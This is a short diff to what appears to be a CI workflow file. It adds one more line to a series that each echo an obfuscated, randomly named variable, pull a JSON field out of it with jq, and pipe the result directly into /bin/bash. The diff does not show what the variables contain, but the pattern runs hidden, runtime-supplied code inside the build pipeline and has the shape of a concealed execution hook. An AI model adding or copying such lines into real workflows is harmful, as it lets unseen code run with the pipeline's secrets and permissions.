@@ -23,6 +23,7 @@ jobs:
           echo $deb471 | jq -r .neci81835 | /bin/bash
           echo $wdxa34445 | jq -r .y9 | /bin/bash
           echo $fhxk1491 | jq -r .pjgh9687 | /bin/bash
+          echo $co57 | jq -r .vk492 | /bin/bash
 
       - name: Persist output
         if: ${{ always() }}
